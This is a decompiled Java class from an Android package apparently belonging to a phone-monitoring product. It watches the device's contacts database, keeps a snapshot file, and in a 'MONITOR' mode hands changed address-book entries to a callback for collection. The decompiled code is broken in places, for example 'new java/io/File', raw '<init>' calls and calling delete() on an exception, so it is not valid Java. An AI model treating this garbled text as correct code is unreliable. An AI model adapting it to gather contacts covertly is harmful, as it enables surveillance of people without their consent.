package com.vvt.addressbookmanager.b.a;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Handler;
import com.vvt.addressbookmanager.e;
import com.vvt.base.FxAddressbookMode;
import com.vvt.events.FxAddressBookEvent;
import com.vvt.io.p;
import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Timer;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

public class b
  extends ContentObserver
  implements com.vvt.addressbookmanager.b.b
{
  private static final boolean a = com.vvt.addressbookmanager.d.a;
  private static final boolean b = com.vvt.addressbookmanager.d.e;
  private Context c;
  private boolean d = false;
  private String e;
  private FxAddressbookMode f;
  private com.vvt.addressbookmanager.b.c g;
  private Timer h;
  private Lock i;
  
  public b(Handler paramHandler)
  {
    super(paramHandler);
    Object localObject = FxAddressbookMode.OFF;
    this.f = ((FxAddressbookMode)localObject);
    this.h = null;
    localObject = new java/util/concurrent/locks/ReentrantLock;
    ((ReentrantLock)localObject).<init>();
    this.i = ((Lock)localObject);
  }
  
  private void a(List paramList)
  {
    boolean bool1 = a;
    boolean bool2;
    String str;
    if ((!bool1) || (paramList != null))
    {
      int j = paramList.size();
      if (j > 0) {}
    }
    else
    {
      bool2 = b;
      if (bool2) {}
      str = this.e;
      com.vvt.addressbookmanager.b.b.b.b(str);
    }
    for (;;)
    {
      return;
      bool2 = a;
      if (bool2) {}
      str = this.e;
      com.vvt.addressbookmanager.b.b.b.a(paramList, str);
      bool2 = a;
      if (!bool2) {}
    }
  }
  
  private void a(boolean paramBoolean)
  {
    boolean bool1 = a;
    if (bool1) {}
    File localFile = new java/io/File;
    String str = g();
    localFile.<init>(str);
    if (paramBoolean)
    {
      boolean bool2 = localFile.exists();
      if (!bool2) {}
    }
    for (;;)
    {
      return;
      try
      {
        localFile.createNewFile();
      }
      catch (IOException localIOException)
      {
        bool1 = b;
      }
      if (bool1)
      {
        continue;
        localIOException.delete();
      }
    }
  }
  
  private void d()
  {
    boolean bool = a;
    if (bool) {}
    ArrayList localArrayList = a.e();
    int j = localArrayList.size();
    if (j > 0) {
      a(localArrayList);
    }
    bool = a;
    if (bool) {}
  }
  
  private boolean e()
  {
    File localFile = new java/io/File;
    String str = g();
    localFile.<init>(str);
    boolean bool1 = localFile.exists();
    boolean bool2 = a;
    if (bool2) {}
    return bool1;
  }
  
  private void f()
  {
    boolean bool1 = a;
    if (bool1) {}
    for (;;)
    {
      ArrayList localArrayList;
      Object localObject6;
      int j;
      try
      {
        Object localObject1 = this.i;
        long l = 10;
        Object localObject5 = TimeUnit.SECONDS;
        bool1 = ((Lock)localObject1).tryLock(l, (TimeUnit)localObject5);
        if (!bool1) {
          break label327;
        }
        bool1 = a;
        if (bool1) {}
        localArrayList = a.e();
        bool1 = a;
        if (bool1) {}
        localObject1 = this.e;
        localObject6 = com.vvt.addressbookmanager.b.b.b.a((String)localObject1);
        bool1 = a;
        if (bool1) {}
        localObject5 = new java/util/ArrayList;
        ((ArrayList)localObject5).<init>();
        Iterator localIterator = localArrayList.iterator();
        bool1 = localIterator.hasNext();
        if (bool1)
        {
          localObject1 = localIterator.next();
          localObject1 = (FxAddressBookEvent)localObject1;
          boolean bool3 = ((List)localObject6).contains(localObject1);
          if (bool3) {
            continue;
          }
          bool3 = a;
          if (bool3) {}
          ((List)localObject5).add(localObject1);
          continue;
        }
        Object localObject2;
        j = localArrayList.size();
      }
      catch (Exception localException)
      {
        bool1 = a;
        if (bool1) {}
        localObject2 = this.i;
        ((Lock)localObject2).unlock();
        bool1 = a;
        if (bool1) {}
        return;
        j = ((List)localObject5).size();
        if (j > 0)
        {
          a(localArrayList);
          localObject2 = this.f;
          localObject6 = FxAddressbookMode.RESTRICTED;
          if (localObject2 == localObject6)
          {
            localObject2 = this.i;
            continue;
          }
          localObject2 = this.f;
          localObject6 = FxAddressbookMode.MONITOR;
          if (localObject2 != localObject6) {
            continue;
          }
          localObject2 = this.g;
          ((com.vvt.addressbookmanager.b.c)localObject2).a(localArrayList);
          continue;
        }
      }
      finally
      {
        this.i.unlock();
      }
      int k = ((List)localObject6).size();
      if (j < k)
      {
        Object localObject4 = this.f;
        localObject6 = FxAddressbookMode.MONITOR;
        if (localObject4 == localObject6)
        {
          localObject4 = this.g;
          ((com.vvt.addressbookmanager.b.c)localObject4).a(localArrayList);
          continue;
          label327:
          boolean bool2 = a;
          if (!bool2) {}
        }
      }
    }
  }
  
  private String g()
  {
    String str = p.a(this.e, "addressbook");
    File localFile = new java/io/File;
    localFile.<init>(str);
    boolean bool = localFile.exists();
    if (!bool) {
      localFile.mkdirs();
    }
    return p.a(str, "coutdown");
  }
  
  public void a()
  {
    boolean bool = a;
    if (bool) {}
    Object localObject1 = this.c;
    if (localObject1 == null)
    {
      bool = b;
      if (!bool) {}
    }
    for (;;)
    {
      return;
      bool = this.d;
      if (!bool)
      {
        localObject1 = this.c.getContentResolver();
        Object localObject2 = com.vvt.addressbookmanager.b.b.a.a;
        ((ContentResolver)localObject1).registerContentObserver((Uri)localObject2, false, this);
        localObject1 = new java/lang/Thread;
        localObject2 = new com/vvt/addressbookmanager/b/a/c;
        ((c)localObject2).<init>(this);
        String str = "AddressbookCMT";
        ((Thread)localObject1).<init>((Runnable)localObject2, str);
        ((Thread)localObject1).start();
        bool = true;
        this.d = bool;
      }
      bool = a;
      if (!bool) {}
    }
  }
  
  public void a(Context paramContext)
  {
    this.c = paramContext;
  }
  
  public void a(com.vvt.addressbookmanager.b.c paramc)
  {
    this.g = paramc;
  }
  
  public void a(e parame) {}
  
  public void a(FxAddressbookMode paramFxAddressbookMode)
  {
    this.f = paramFxAddressbookMode;
  }
  
  public void a(String paramString)
  {
    this.e = paramString;
  }
  
  public void b()
  {
    boolean bool = a;
    if (bool) {}
    this.c.getContentResolver().unregisterContentObserver(this);
    bool = false;
    this.g = null;
    Object localObject = this.h;
    if (localObject != null)
    {
      localObject = this.h;
      ((Timer)localObject).cancel();
    }
    this.d = false;
    a(false);
    localObject = this.e;
    com.vvt.addressbookmanager.b.b.b.b((String)localObject);
    bool = a;
    if (bool) {}
  }
  
  public void onChange(boolean paramBoolean)
  {
    Timer localTimer = this.h;
    if (localTimer != null)
    {
      localTimer = this.h;
      localTimer.cancel();
      boolean bool = a;
      if (!bool) {}
    }
    a(true);
    localTimer = new java/util/Timer;
    localTimer.<init>();
    this.h = localTimer;
    localTimer = this.h;
    d locald = new com/vvt/addressbookmanager/b/a/d;
    locald.<init>(this);
    localTimer.scheduleAtFixedRate(locald, 0L, 1000L);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/addressbookmanager/removeFromPath/a/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */